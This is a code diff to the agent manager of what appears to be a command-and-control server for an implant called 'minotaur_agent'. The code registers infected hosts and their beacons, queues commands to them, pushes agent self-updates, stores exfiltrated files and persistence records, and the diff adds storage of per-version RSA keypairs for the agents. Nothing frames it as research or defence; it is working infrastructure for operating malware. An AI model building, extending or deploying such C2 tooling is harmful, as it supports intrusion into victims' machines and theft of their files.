@@ -9,7 +9,7 @@ DB_PATH = os.path.join(os.path.dirname(__file__), '../../database/c2.db')
 activity_logger = ActivityLogger()
 
 class AgentManager:
-    def __init__(self, socketio):
+    def __init__(self, socketio=None):
         self.socketio = socketio
         self._init_db()
 
@@ -17,26 +17,18 @@ class AgentManager:
         os.makedirs(os.path.dirname(DB_PATH), exist_ok=True)
         conn = sqlite3.connect(DB_PATH)
         c = conn.cursor()
-        # Create agents table (base columns)
         c.execute('''CREATE TABLE IF NOT EXISTS agents (
             id TEXT PRIMARY KEY,
             hostname TEXT,
             os TEXT,
             ip TEXT,
             arch TEXT,
+            version TEXT,
+            platform TEXT,
             first_seen TEXT,
             last_beacon TEXT,
             status TEXT
         )''')
-        # Add missing columns if needed (migration)
-        c.execute("PRAGMA table_info(agents)")
-        columns = [col[1] for col in c.fetchall()]
-        if 'version' not in columns:
-            c.execute("ALTER TABLE agents ADD COLUMN version TEXT")
-        if 'platform' not in columns:
-            c.execute("ALTER TABLE agents ADD COLUMN platform TEXT")
-
-        # Other tables
         c.execute('''CREATE TABLE IF NOT EXISTS agent_commands (
             id TEXT PRIMARY KEY,
             agent_id TEXT,
@@ -79,6 +71,14 @@ class AgentManager:
             details TEXT,
             reported_at TEXT
         )''')
+        c.execute('''CREATE TABLE IF NOT EXISTS agent_rsa_keys (
+            version TEXT NOT NULL,
+            platform TEXT NOT NULL,
+            private_key TEXT NOT NULL,
+            public_key TEXT NOT NULL,
+            created_at TEXT NOT NULL,
+            PRIMARY KEY (version, platform)
+        )''')
         conn.commit()
         conn.close()
 
@@ -97,7 +97,8 @@ class AgentManager:
                       (now, version, platform, agent_id))
             conn.commit()
             conn.close()
-            self.socketio.emit('new_agent', {'id': agent_id, 'hostname': hostname, 'os': os_type, 'ip': ip})
+            if self.socketio:
+                self.socketio.emit('new_agent', {'id': agent_id, 'hostname': hostname, 'os': os_type, 'ip': ip})
             return agent_id
         else:
             agent_id = str(uuid.uuid4())
@@ -107,7 +108,8 @@ class AgentManager:
                       (agent_id, hostname, os_type, ip, arch, version, platform, now, now, 'active'))
             conn.commit()
             conn.close()
-            self.socketio.emit('new_agent', {'id': agent_id, 'hostname': hostname, 'os': os_type, 'ip': ip})
+            if self.socketio:
+                self.socketio.emit('new_agent', {'id': agent_id, 'hostname': hostname, 'os': os_type, 'ip': ip})
             return agent_id
 
     def update_beacon(self, agent_id):
@@ -121,7 +123,6 @@ class AgentManager:
     def get_pending_commands(self, agent_id, agent_version=None, agent_platform=None):
         conn = sqlite3.connect(DB_PATH)
         c = conn.cursor()
-        # Get existing pending commands
         c.execute("SELECT id, type, payload FROM agent_commands WHERE agent_id=? AND status='pending'", (agent_id,))
         rows = c.fetchall()
         commands = []
@@ -131,16 +132,13 @@ class AgentManager:
                 'type': row[1],
                 'payload': json.loads(row[2])
             })
-        # Mark them as sent
         c.execute("UPDATE agent_commands SET status='sent', sent_at=? WHERE agent_id=? AND status='pending'",
                   (datetime.utcnow().isoformat(), agent_id))
 
-        # Check for version update (only if we have current version table)
-        try:
+        if agent_version and agent_platform:
             c.execute("SELECT version FROM agent_current_version WHERE platform=?", (agent_platform,))
             row = c.fetchone()
             if row and row[0] != agent_version:
-                # Build download URL for the new version
                 version_dir = agent_platform.replace('/', '_')
                 filename = f"minotaur_agent_{agent_platform.replace('/', '_')}_{row[0]}{'.exe' if 'windows' in agent_platform else ''}"
                 url = f"/static/agents/versions/{version_dir}/{filename}"
@@ -150,9 +148,6 @@ class AgentManager:
                     'payload': {'version': row[0], 'url': url}
                 }
                 commands.insert(0, update_cmd)
-        except sqlite3.OperationalError:
-            # Table doesn't exist yet – ignore
-            pass
         conn.commit()
         conn.close()
         return commands
@@ -190,12 +185,13 @@ class AgentManager:
         conn.commit()
         conn.close()
         activity_logger.log_agent_result(command_id, output, error, now)
-        self.socketio.emit('agent_result', {
-            'agent_id': agent_id,
-            'command_id': command_id,
-            'output': output,
-            'error': error
-        })
+        if self.socketio:
+            self.socketio.emit('agent_result', {
+                'agent_id': agent_id,
+                'command_id': command_id,
+                'output': output,
+                'error': error
+            })
 
     def save_exfil(self, agent_id, file_path, file_b64):
         now = datetime.utcnow().isoformat()
@@ -206,7 +202,8 @@ class AgentManager:
                   (agent_id, file_path, file_b64, now))
         conn.commit()
         conn.close()
-        self.socketio.emit('exfil_received', {'agent_id': agent_id, 'file_path': file_path})
+        if self.socketio:
+            self.socketio.emit('exfil_received', {'agent_id': agent_id, 'file_path': file_path})
 
     def delete_agent(self, agent_id):
         conn = sqlite3.connect(DB_PATH)
@@ -215,7 +212,8 @@ class AgentManager:
         c.execute("DELETE FROM agent_commands WHERE agent_id=? AND status='pending'", (agent_id,))
         conn.commit()
         conn.close()
-        self.socketio.emit('agent_deleted', {'agent_id': agent_id})
+        if self.socketio:
+            self.socketio.emit('agent_deleted', {'agent_id': agent_id})
 
     def clear_all_agents(self):
         conn = sqlite3.connect(DB_PATH)
@@ -228,30 +226,13 @@ class AgentManager:
         c.execute("DELETE FROM agent_persistence")
         conn.commit()
         conn.close()
-        self.socketio.emit('agents_cleared', {})
+        if self.socketio:
+            self.socketio.emit('agents_cleared', {})
 
     def list_agents(self):
         conn = sqlite3.connect(DB_PATH)
         c = conn.cursor()
-        # Ensure columns exist (should be safe)
-        try:
-            c.execute("SELECT id, hostname, os, ip, arch, version, platform, first_seen, last_beacon, status FROM agents WHERE status='active' ORDER BY first_seen DESC")
-        except sqlite3.OperationalError as e:
-            if "no such column: version" in str(e):
-                # Fallback to old schema if columns missing (should not happen after migration)
-                c.execute("SELECT id, hostname, os, ip, arch, first_seen, last_beacon, status FROM agents WHERE status='active' ORDER BY first_seen DESC")
-                rows = c.fetchall()
-                agents = []
-                for row in rows:
-                    agents.append({
-                        'id': row[0], 'hostname': row[1], 'os': row[2], 'ip': row[3],
-                        'arch': row[4], 'version': 'unknown', 'platform': 'unknown',
-                        'first_seen': row[5], 'last_beacon': row[6], 'status': row[7]
-                    })
-                conn.close()
-                return agents
-            else:
-                raise
+        c.execute("SELECT id, hostname, os, ip, arch, version, platform, first_seen, last_beacon, status FROM agents WHERE status='active' ORDER BY first_seen DESC")
         rows = c.fetchall()
         agents = []
         for row in rows:
@@ -262,3 +243,28 @@ class AgentManager:
             })
         conn.close()
         return agents
+
+    def store_rsa_keypair(self, version, platform, priv_pem, pub_pem):
+        conn = sqlite3.connect(DB_PATH)
+        c = conn.cursor()
+        now = datetime.utcnow().isoformat()
+        c.execute("INSERT OR REPLACE INTO agent_rsa_keys (version, platform, private_key, public_key, created_at) VALUES (?,?,?,?,?)",
+                  (version, platform, priv_pem, pub_pem, now))
+        conn.commit()
+        conn.close()
+
+    def get_rsa_private_key(self, version, platform):
+        conn = sqlite3.connect(DB_PATH)
+        c = conn.cursor()
+        c.execute("SELECT private_key FROM agent_rsa_keys WHERE version=? AND platform=?", (version, platform))
+        row = c.fetchone()
+        conn.close()
+        return row[0] if row else None
+
+    def get_rsa_public_key(self, version, platform):
+        conn = sqlite3.connect(DB_PATH)
+        c = conn.cursor()
+        c.execute("SELECT public_key FROM agent_rsa_keys WHERE version=? AND platform=?", (version, platform))
+        row = c.fetchone()
+        conn.close()
+        return row[0] if row else None
